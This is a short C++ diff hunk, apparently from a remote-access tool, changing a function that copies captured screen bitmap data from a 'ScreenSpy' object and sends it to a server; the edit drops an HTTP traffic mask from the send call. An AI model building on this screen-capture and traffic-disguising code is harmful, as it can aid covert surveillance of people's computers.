@@ -262,7 +262,7 @@ VOID CScreenManager::SendBitMapInfo()
     //这里将bmp位图结构发送出去
     memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), ulLength - 1);
     HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
-    m_ClientObject->Send2Server((char*)szBuffer, ulLength, &mask);
+    m_ClientObject->Send2Server((char*)szBuffer, ulLength, 0);
     VirtualFree(szBuffer, 0, MEM_RELEASE);
 }
 
